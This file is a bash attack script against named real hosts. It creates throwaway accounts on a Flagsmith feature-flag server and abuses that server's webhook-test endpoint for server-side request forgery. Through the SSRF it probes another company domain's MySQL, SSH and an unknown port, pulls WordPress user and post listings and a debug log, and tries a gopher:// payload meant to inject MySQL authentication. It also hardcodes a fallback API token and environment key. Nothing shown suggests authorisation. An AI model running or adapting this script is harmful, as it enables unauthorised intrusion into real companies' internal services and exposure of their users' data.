#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v23-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

if [ -z "$KEY" ]; then
  # Use latest known working account
  KEY="0cb53dd00f936c2de9e7ba6061bdf7f93e596d2b"
  EKEY="Ldqx3Z27VxYrTFXgWYiZhb"
  echo "Fallback"
else
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v23"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
  echo "Env: $EKEY"
fi

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

# === TEST 1: MySQL port via HTTP (leak version) ===
echo "=== MYSQL VIA HTTP ==="
SSRF "http://koinp2p.com:3306/"
echo ""

# === TEST 2: WP REST API (was 200 from agent scan!) ===
echo "=== WP REST API ==="
SSRF "http://koinp2p.com/wp-json/"
echo ""

# === TEST 3: WP REST API users (might be public from internal) ===
echo "=== WP REST USERS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/users"
echo ""

# === TEST 4: WP REST API posts ===
echo "=== WP REST POSTS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/posts"
echo ""

# === TEST 5: Port 9090 (unknown service) ===
echo "=== PORT 9090 ==="
SSRF "http://koinp2p.com:9090/"
echo ""

# === TEST 6: SSH port (banner) ===
echo "=== SSH PORT ==="
SSRF "http://koinp2p.com:22/"
echo ""

# === TEST 7: Gopher to MySQL (inject MySQL auth) ===
echo "=== GOPHER MYSQL ==="
SSRF "gopher://koinp2p.com:3306/_"
echo ""

# === TEST 8: Use HTTP via internal hostname ===
echo "=== INTERNAL HTTP ==="
SSRF "http://koinp2p.com/wp-content/debug.log"
echo ""
